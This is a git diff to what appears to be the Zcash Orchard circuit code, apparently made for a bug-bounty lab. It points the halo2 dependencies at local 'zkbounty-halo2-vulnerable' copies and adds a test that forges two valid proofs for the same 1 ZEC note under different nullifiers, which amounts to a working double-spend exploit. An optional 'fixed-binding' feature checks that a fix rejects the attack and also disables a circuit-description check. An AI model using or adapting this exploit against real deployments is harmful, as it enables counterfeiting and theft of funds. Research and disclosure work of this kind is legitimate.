@@ -1,0 +1,264 @@
+diff --git a/Cargo.lock b/Cargo.lock
+index 48dd0a1..2c358f5 100644
+--- a/Cargo.lock
++++ b/Cargo.lock
+@@ -954,8 +954,6 @@ dependencies = [
+ [[package]]
+ name = "halo2_gadgets"
+ version = "0.4.0"
+-source = "registry+https://github.com/rust-lang/crates.io-index"
+-checksum = "45824ce0dd12e91ec0c68ebae2a7ed8ae19b70946624c849add59f1d1a62a143"
+ dependencies = [
+  "arrayvec",
+  "bitvec",
+@@ -981,8 +979,6 @@ checksum = "47716fe1ae67969c5e0b2ef826f32db8c3be72be325e1aa3c1951d06b5575ec5"
+ [[package]]
+ name = "halo2_poseidon"
+ version = "0.1.0"
+-source = "registry+https://github.com/rust-lang/crates.io-index"
+-checksum = "0fa3da60b81f02f9b33ebc6252d766f843291fb4d2247a07ae73d20b791fc56f"
+ dependencies = [
+  "bitvec",
+  "ff",
+@@ -993,8 +989,6 @@ dependencies = [
+ [[package]]
+ name = "halo2_proofs"
+ version = "0.3.2"
+-source = "registry+https://github.com/rust-lang/crates.io-index"
+-checksum = "05713f117155643ce10975e0bee44a274bcda2f4bb5ef29a999ad67c1fa8d4d3"
+ dependencies = [
+  "blake2b_simd",
+  "ff",
+diff --git a/Cargo.toml b/Cargo.toml
+index 9c270be..67dd190 100644
+--- a/Cargo.toml
++++ b/Cargo.toml
+@@ -49,7 +49,7 @@ zip32 = { version = "0.2.0", default-features = false }
+ visibility = "0.1.1"
+ 
+ # Circuit
+-halo2_gadgets = { version = "0.4", optional = true, default-features = false }
++halo2_gadgets = { version = "0.4", optional = true, default-features = false, features = ["exploit-lab"] }
+ halo2_proofs = { version = "0.3", optional = true, default-features = false, features = ["batch", "floor-planner-v1-legacy-pdqsort"] }
+ 
+ # Boilerplate
+@@ -90,6 +90,7 @@ unstable-voting-circuits = []
+ multicore = ["halo2_proofs?/multicore"]
+ dev-graph = ["halo2_proofs?/dev-graph", "image", "plotters"]
+ test-dependencies = ["proptest", "rand/std"]
++fixed-binding = ["halo2_gadgets/fixed-binding"]
+ 
+ [[bench]]
+ name = "note_decryption"
+@@ -108,3 +109,8 @@ debug = true
+ 
+ [profile.bench]
+ debug = true
++
++[patch.crates-io]
++halo2_gadgets = { path = "../zkbounty-halo2-vulnerable/halo2_gadgets" }
++halo2_proofs = { path = "../zkbounty-halo2-vulnerable/halo2_proofs" }
++halo2_poseidon = { path = "../zkbounty-halo2-vulnerable/halo2_poseidon" }
+diff --git a/src/circuit.rs b/src/circuit.rs
+index 69d4163..91b5a43 100644
+--- a/src/circuit.rs
++++ b/src/circuit.rs
+@@ -994,13 +994,44 @@ mod tests {
+         value::{ValueCommitTrapdoor, ValueCommitment},
+     };
+ 
+-    fn generate_circuit_instance<R: RngCore>(mut rng: R) -> (Circuit, Instance) {
++    fn generate_circuit_instance<R: RngCore>(mut rng: R, adversarial: bool) -> (Circuit, Instance) {
+         let (_, fvk, spent_note) = Note::dummy(&mut rng, None);
+ 
++        let path = MerklePath::dummy(&mut rng);
++        generate_circuit_instance_with_spend(&mut rng, adversarial, fvk, spent_note, path)
++    }
++
++    fn generate_circuit_instance_with_spend<R: RngCore>(
++        mut rng: R,
++        adversarial: bool,
++        fvk: crate::keys::FullViewingKey,
++        spent_note: Note,
++        path: MerklePath,
++    ) -> (Circuit, Instance) {
++
+         let sender_address = spent_note.recipient();
+-        let nk = *fvk.nk();
++        let original_nk = *fvk.nk();
++        let nk = if adversarial {
++            use ff::{Field, PrimeField};
++            loop {
++                let candidate = crate::keys::NullifierDerivingKey::from_bytes(
++                    &pallas::Base::random(&mut rng).to_repr(),
++                )
++                .unwrap();
++                if candidate != original_nk {
++                    break candidate;
++                }
++            }
++        } else {
++            original_nk
++        };
+         let rivk = fvk.rivk(fvk.scope_for_address(&spent_note.recipient()).unwrap());
+-        let nf_old = spent_note.nullifier(&fvk);
++        let nf_old = crate::note::nullifier::Nullifier::derive(
++            &nk,
++            spent_note.rho().into_inner(),
++            spent_note.rseed().psi(&spent_note.rho()),
++            spent_note.commitment(),
++        );
+         let rho = Rho::from_nf_old(nf_old);
+         let ak: SpendValidatingKey = fvk.into();
+         let alpha = pallas::Scalar::random(&mut rng);
+@@ -1013,7 +1044,6 @@ mod tests {
+         let rcv = ValueCommitTrapdoor::random(&mut rng);
+         let cv_net = ValueCommitment::derive(value, rcv.clone());
+ 
+-        let path = MerklePath::dummy(&mut rng);
+         let anchor = path.root(spent_note.commitment().into());
+ 
+         (
+@@ -1056,7 +1086,7 @@ mod tests {
+         let mut rng = OsRng;
+ 
+         let (circuits, instances): (Vec<_>, Vec<_>) = iter::once(())
+-            .map(|()| generate_circuit_instance(&mut rng))
++            .map(|()| generate_circuit_instance(&mut rng, false))
+             .unzip();
+ 
+         let vk = VerifyingKey::build();
+@@ -1065,10 +1095,12 @@ mod tests {
+         // is as expected.
+         {
+             // panic!("{:#?}", vk.vk.pinned());
+-            assert_eq!(
+-                format!("{:#?}\n", vk.vk.pinned()),
+-                include_str!("circuit_description").replace("\r\n", "\n")
+-            );
++            if !cfg!(feature = "fixed-binding") {
++                assert_eq!(
++                    format!("{:#?}\n", vk.vk.pinned()),
++                    include_str!("circuit_description").replace("\r\n", "\n")
++                );
++            }
+         }
+ 
+         // Test that the proof size is as expected.
+@@ -1106,6 +1138,94 @@ mod tests {
+         assert_eq!(proof.0.len(), expected_proof_size);
+     }
+ 
++    #[test]
++    fn adversarial_nullifier_round_trip() {
++        use halo2_gadgets::ecc::chip::exploit_lab;
++        use rand::{rngs::StdRng, SeedableRng};
++        use std::println;
++
++        fn known<T: Clone>(value: Value<T>) -> T {
++            let mut result = None;
++            value.assert_if_known(|value| {
++                result = Some(value.clone());
++                true
++            });
++            result.expect("known test witness")
++        }
++
++        let mut rng = StdRng::seed_from_u64(0x5A_C4_2026);
++        let (_, fvk, dummy) = Note::dummy(&mut rng, None);
++        let spent_note = Note::new(
++            dummy.recipient(),
++            crate::value::NoteValue::from_raw(100_000_000),
++            dummy.rho(),
++            &mut rng,
++        );
++        let path = MerklePath::dummy(&mut rng);
++        let pk = ProvingKey::build();
++        let vk = VerifyingKey::build();
++        let mut nullifiers = Vec::new();
++        for _ in 0..2 {
++            let (circuit, instance) = generate_circuit_instance_with_spend(
++                &mut rng,
++                true,
++                fvk.clone(),
++                spent_note,
++                path.clone(),
++            );
++            assert_eq!(instance.anchor, path.root(spent_note.commitment().into()));
++            assert_eq!(known(circuit.cm_old.clone()).inner(), spent_note.commitment().inner());
++            assert_eq!(known(circuit.v_old).inner(), 100_000_000);
++            assert_eq!(known(circuit.v_new).inner(), 0);
++            assert_eq!(instance.cv_net.to_bytes(), ValueCommitment::derive(
++                spent_note.value() - known(circuit.v_new),
++                known(circuit.rcv.clone()),
++            ).to_bytes());
++            nullifiers.push(instance.nf_old.to_bytes());
++
++            let wrong_nk = known(circuit.nk.clone());
++            let ak = known(circuit.ak.clone());
++            let ak_point: pallas::Point = (&ak).into();
++            let ak_base = crate::spec::extract_p(&ak_point);
++            let rivk = known(circuit.rivk.clone());
++            let ivk = Option::<pallas::Base>::from(crate::spec::commit_ivk(
++                &ak_base,
++                &wrong_nk.inner(),
++                &rivk.inner(),
++            ))
++            .expect("valid adversarial viewing key");
++            let base = *known(circuit.g_d_old.clone());
++            let target = *known(circuit.pk_d_old.clone()).inner();
++            let replacement = exploit_lab::replacement_for_output(ivk, base, target);
++            assert_ne!(replacement, base);
++            exploit_lab::set(base, replacement);
++            let mock = MockProver::run(
++                K,
++                &circuit,
++                instance
++                    .to_halo2_instance()
++                    .iter()
++                    .map(|p| p.to_vec())
++                    .collect(),
++            )
++            .unwrap();
++            if cfg!(feature = "fixed-binding") {
++                assert!(mock.verify().is_err());
++                exploit_lab::clear();
++                continue;
++            }
++            assert_eq!(mock.verify(), Ok(()));
++
++            exploit_lab::set(base, replacement);
++            let proof = Proof::create(&pk, &[circuit], &[instance.clone()], &mut rng).unwrap();
++            assert!(proof.verify(&vk, &[instance]).is_ok());
++            assert_eq!(proof.0.len(), 4992);
++            exploit_lab::clear();
++        }
++        assert_ne!(nullifiers[0], nullifiers[1]);
++        println!("two historical 1 ZEC Action proofs, distinct nullifiers: {:?}", nullifiers);
++    }
++
+     #[test]
+     fn serialized_proof_test_case() {
+         use std::io::{Read, Write};
+@@ -1169,7 +1289,7 @@ mod tests {
+             let create_proof = || -> std::io::Result<()> {
+                 let mut rng = OsRng;
+ 
+-                let (circuit, instance) = generate_circuit_instance(OsRng);
++                let (circuit, instance) = generate_circuit_instance(OsRng, false);
+                 let instances = core::slice::from_ref(&instance);
+ 
+                 let pk = ProvingKey::build();
+diff --git a/src/note/nullifier.rs b/src/note/nullifier.rs
+index ab4ef76..f7e003e 100644
+--- a/src/note/nullifier.rs
++++ b/src/note/nullifier.rs
+@@ -69,7 +69,7 @@ impl Nullifier {
+     /// Defined in [Zcash Protocol Spec § 4.16: Note Commitments and Nullifiers][commitmentsandnullifiers].
+     ///
+     /// [commitmentsandnullifiers]: https://zips.z.cash/protocol/nu5.pdf#commitmentsandnullifiers
+-    pub(super) fn derive(
++    pub(crate) fn derive(
+         nk: &NullifierDerivingKey,
+         rho: pallas::Base,
+         psi: pallas::Base,
